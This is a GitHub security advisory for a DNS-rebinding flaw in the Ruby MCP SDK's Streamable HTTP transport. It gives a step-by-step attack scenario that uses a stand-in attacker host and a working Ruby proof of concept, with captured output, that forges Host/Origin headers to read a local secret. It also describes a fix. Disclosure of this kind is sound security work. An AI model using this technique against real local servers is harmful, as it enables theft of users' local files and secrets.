# [M] MCP Ruby SDK: Streamable HTTP transport lacks DNS-rebinding (Host/Origin) protection

## Summary
Severity: Medium
Advisory: GHSA-rjr6-rcgv-9m7m
CVE: CVE-2026-63118
CWE: CWE-346, CWE-350
Ecosystem: RubyGems
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-rjr6-rcgv-9m7m
Type: github-advisory

## Affected
- RubyGems: `mcp` — affected >=0 <0.23.0

## Details
## Summary

`MCP::Server::Transports::StreamableHTTPTransport` (the Rack-mountable Streamable HTTP transport in the `mcp` gem) processes every incoming JSON-RPC request without ever inspecting the HTTP `Host` or `Origin` request headers. There is no `AllowedHosts`/`AllowedOrigins` allowlist and no DNS-rebinding guard anywhere in the transport. A local MCP server that binds a loopback or LAN HTTP port is therefore reachable by any web origin a victim's browser visits, via a DNS-rebinding attack: a malicious page rebinds its own hostname to `127.0.0.1`, then drives the local MCP server cross-origin to enumerate and invoke its tools and exfiltrate their output. This is the standard browser-driven local-service attack that the MCP Streamable HTTP guidance exists to prevent.

## Impact

- An attacker who can get a victim to open a web page can reach any MCP server the victim runs locally over the Streamable HTTP transport (e.g. a developer-tools or filesystem MCP server on `localhost`).
- Because the transport issues a session and dispatches `tools/list` / `tools/call` from a foreign `Host`/`Origin` with no rejection, the attacker can drive arbitrary server-exposed tools and read their results, exfiltrating local data (files, secrets, command output) to the attacker's origin.
- The blast radius is whatever the locally-running MCP server exposes. For MCP servers wired to filesystem, shell, or credential tools, this is sensitive-data disclosure and, depending on the tool set, local action execution.

## Vulnerable code

File: `lib/mcp/server/transports/streamable_http_transport.rb` (gem `mcp` 0.18.0).

The Rack entrypoint and POST handler validate `Accept`, `Content-Type`, `Mcp-Session-Id`, and `Mcp-Protocol-Version`, but never `Host` or `Origin`:

```ruby
# call(env) -> handle_request(Rack::Request.new(env))  (line 56)
def handle_post(request)
  required_types = @enable_json_response ? REQUIRED_POST_ACCEPT_TYPES_JSON : REQUIRED_POST_ACCEPT_TYPES_SSE
  accept_error = validate_accept_header(request, required_types)   # line 335 - checks Accept only
  return accept_error if accept_error

  content_type_error = validate_content_type(request)             # line 338 - checks Content-Type only
  return content_type_error if content_type_error

  body_string = request.body.read
  session_id = extract_session_id(request)                        # line 342 - reads HTTP_MCP_SESSION_ID
```

No statement anywhere in `handle_post`, `handle_request`, or any helper reads `request.env["HTTP_HOST"]` or `request.env["HTTP_ORIGIN"]`.

The only request-env reads in the whole class are:

- `extract_session_id` -> `request.env["HTTP_MCP_SESSION_ID"]` (line 489)
- `validate_accept_header` -> `request.env["HTTP_ACCEPT"]` (line 493)
- `validate_content_type` -> `request.env["CONTENT_TYPE"]` (line 512)
- `validate_protocol_version_header` -> `request.env["HTTP_MCP_PROTOCOL_VERSION"]` (line 546)

A repository-wide search of `lib/` for `HTTP_HOST`, `HTTP_ORIGIN`, `allowed_host`, `allowed_origin`, `rebind`, or `dns.rebind` returns zero matches, confirming no allowlist or rebinding guard exists in the shipped library. The `examples/` tree mounts `Rack::Cors` as application-level middleware, but that is example glue, not a transport-level control, and CORS does not stop a DNS-rebinding attack that arrives as a same-origin request after rebinding.

## How the input reaches the sink (attack scenario)

1. A developer runs an MCP server over `StreamableHTTPTransport`, mounted as a Rack app on a local HTTP port (loopback or LAN).
2. The victim opens `http://evil.attacker.com` in a browser. The page resolves to the attacker's server, which then re-answers DNS for `evil.attacker.com` with `127.0.0.1` (DNS rebinding). The browser now treats requests to `evil.attacker.com` as going to the local MCP server, with `Host: evil.attacker.com` / `Origin: http://evil.attacker.com`.
3. The page POSTs an `initialize` request. The transport accepts it (it never looks at `Host`/`Origin`), creates a session, and returns `Mcp-Session-Id`.
4. The page then POSTs `tools/call`, and the transport executes the server's tool and returns its output to the foreign origin. Local data is exfiltrated.

## Proof of concept (end-to-end reproduction)

Run against the real released gem `mcp` 0.18.0 (no stubs). The script builds an `MCP::Server` with a tool that returns sensitive local data, instantiates the real `StreamableHTTPTransport`, and drives it with `Rack::Request` env hashes carrying a forged `Host`/`Origin`. It then re-runs as a legitimate localhost client (negative control).

Install:

```
gem install mcp -v 0.18.0   # pulls addressable, json-schema, public_suffix
gem install rack            # required by StreamableHTTPTransport
```

PoC (`poc_f1_dnsrebind.rb`):

```ruby
# frozen_string_literal: true
require "mcp"
require "rack"
require "json"
require "stringio"

puts "mcp gem version under test: #{MCP::VERSION}"
puts "transport source: #{MCP::Server::Transports::StreamableHTTPTransport.instance_method(:handle_post).source_location.inspect}"
puts

# A tool whose output is sensitive local data an attacker wants to exfiltrate.
secret_tool = MCP::Tool.define(name: "read_local_secret", description: "returns a local secret") do |*|
  MCP::Tool::Response.new([{ type: "text", text: "TOP-SECRET-LOCAL-DATA-9f3a" }])
end

server = MCP::Server.new(name: "poc_server", version: "1.0.0", tools: [secret_tool])
transport = MCP::Server::Transports::StreamableHTTPTransport.new(server)
PROTO = MCP::Configuration::SUPPORTED_STABLE_PROTOCOL_VERSIONS.last

def rack_post(transport, body_hash, host:, origin:, session_id: nil, proto: nil)
  body = JSON.generate(body_hash)
  env = {
    "REQUEST_METHOD" => "POST", "PATH_INFO" => "/",
    "HTTP_HOST"   => host,    # attacker-controlled Host (DNS-rebind primary vector)
    "HTTP_ORIGIN" => origin,  # attacker-controlled Origin (cross-origin browser vector)
    "HTTP_ACCEPT" => "application/json, text/event-stream",
    "CONTENT_TYPE" => "application/json",
    "rack.input" => StringIO.new(body), "CONTENT_LENGTH" => body.bytesize.to_s,
  }
  env["HTTP_MCP_SESSION_ID"] = session_id if session_id
  env["HTTP_MCP_PROTOCOL_VERSION"] = proto if proto
  status, headers, resp = transport.call(env)
  collected = +""
  if resp.respond_to?(:each)
    resp.each { |c| collected << c.to_s }
  elsif resp.respond_to?(:call)            # stateful tools/call returns an SSE-stream Proc body
    sink = Object.new
    sink.define_singleton_method(:write) { |s| collected << s.to_s }
    sink.define_singleton_method(:flush) {}
    sink.define_singleton_method(:close) {}
    resp.call(sink)
  end
  [status, headers, collected]
end

puts "========== ATTACK: forged Host: attacker.evil.com  Origin: http://evil.attacker.com =========="
init_body = { jsonrpc: "2.0", id: 1, method: "initialize",
  params: { protocolVersion: PROTO, capabilities: {}, clientInfo: { name: "evil-page", version: "1.0" } } }
status, headers, body = rack_post(transport, init_body, host: "attacker.evil.com", origin: "http://evil.attacker.com")
puts "[initialize] HTTP status      : #{status}"
puts "[initialize] Mcp-Session-Id   : #{headers["Mcp-Session-Id"].inspect}"
puts "[initialize] response body     : #{body}"
session = headers["Mcp-Session-Id"]

call_body = { jsonrpc: "2.0", id: 2, method: "tools/call",
  params: { name: "read_local_secret", arguments: {} } }
status2, _h2, body2 = rack_post(transport, call_body,
  host: "attacker.evil.com", origin: "http://evil.attacker.com", session_id: session, proto: PROTO)
puts "[tools/call] HTTP status       : #{status2}"
puts "[tools/call] response body      : #{body2}"
attack_ok = (status == 200 && session && status2 == 200 && body2.include?("TOP-SECRET-LOCAL-DATA-9f3a"))
puts
puts "ATTACK VERDICT: #{attack_ok ? "EXFILTRATED" : "blocked"} -- foreign Host/Origin obtained a session AND read the local secret with NO 403."
puts

puts "========== NEGATIVE CONTROL: legitimate Host: 127.0.0.1:8080  Origin: http://127.0.0.1:8080 =========="
status3, headers3, _b3 = rack_post(transport, init_body, host: "127.0.0.1:8080", origin: "http://127.0.0.1:8080")
puts "[initialize] HTTP status      : #{status3}"
puts "[initialize] Mcp-Session-Id   : #{headers3["Mcp-Session-Id"].inspect}"
puts
puts "CONTROL VERDICT: legitimate client also gets HTTP #{status3} + session -- transport applies the SAME (zero) Host/Origin policy to both."
```

Captured output (verbatim):

```
mcp gem version under test: 0.18.0
transport source: [".../gems/mcp-0.18.0/lib/mcp/server/transports/streamable_http_transport.rb", 333]

========== ATTACK: forged Host: attacker.evil.com  Origin: http://evil.attacker.com ==========
[initialize] HTTP status      : 200
[initialize] Mcp-Session-Id   : "d4fb30b4-b4ec-49a1-a58b-f4cc02bee64b"
[initialize] response body     : {"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{"listChanged":true},"prompts":{"listChanged":true},"resources":{"listChanged":true},"logging":{}},"serverInfo":{"name":"poc_server","version":"1.0.0"}}}
[tools/call] HTTP status       : 200
[tools/call] response body      : data: {"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"TOP-SECRET-LOCAL-DATA-9f3a"}],"isError":false}}

ATTACK VERDICT: EXFILTRATED -- foreign Host/Origin obtained a session AND read the local secret with NO 403.

========== NEGATIVE CONTROL: legitimate Host: 127.0.0.1:8080  Origin: http://127.0.0.1:8080 ==========
[initialize] HTTP status      : 200
[initialize] Mcp-Session-Id   : "bf707a19-a22a-4ff2-aeae-62c20cd7141b"

CONTROL VERDICT: legitimate client also gets HTTP 200 + session -- transport applies the SAME (zero) Host/Origin policy to both.
```

The forged `Host: attacker.evil.com` / `Origin: http://evil.attacker.com` request obtained a valid session and exfiltrated the local secret (`TOP-SECRET-LOCAL-DATA-9f3a`) via `tools/call`, with the transport returning HTTP 200 throughout and never a 403. The negative control confirms the transport applies the identical (empty) policy to a legitimate localhost client, proving there is no Host/Origin discrimination at all.

## Suggested fix

Add an opt-in but secure-by-default Host/Origin allowlist to `StreamableHTTPTransport`, mirroring the DNS-rebinding protection that the TypeScript, Python, Go, Rust, C#, and Java MCP SDKs already ship:

- Accept `allowed_hosts:` and `allowed_origins:` keyword arguments in `initialize`.
- In `handle_request` (before any dispatch), read `request.env["HTTP_HOST"]` and `request.env["HTTP_ORIGIN"]`. If an allowlist is configured and the value is not on it, return `403 Forbidden`.
- Default to allowing only loopback hosts (`127.0.0.1`, `[::1]`, `localhost`) and an empty/absent `Origin`, so a stock local deployment is protected against rebinding out of the box while same-process and same-host clients keep working. Document how to widen the allowlist for non-loopback deployments.

A concrete patch adds an `AllowedHostsValidation` check invoked at the top of `handle_request`. See the Fix PR.

## Fix PR

A fix PR implementing the Host/Origin allowlist with a secure loopback default is open against this advisory's private temporary fork: https://github.com/modelcontextprotocol/ruby-sdk-ghsa-rjr6-rcgv-9m7m/pull/1 . With the patch loaded, the forged-Host request is rejected with `403` (`{"error":"Forbidden: Host not allowed (DNS-rebinding protection)"}`) while a legitimate loopback `Host: 127.0.0.1:8080` request is still served (HTTP 200, session issued).

## Credit

Reported by tonghuaroot.

## Reporter notes

This issue was found by source review of the `mcp` gem's Streamable HTTP transport and confirmed end-to-end against the released gem `mcp` 0.18.0 as shown above. It is reported independently on its own merits.

## References
- https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-rjr6-rcgv-9m7m
- https://nvd.nist.gov/vuln/detail/CVE-2026-63118
- https://github.com/modelcontextprotocol/ruby-sdk/commit/ba543083a7594e7892b29464b89091816446ff7a
- https://github.com/modelcontextprotocol/ruby-sdk
- https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0
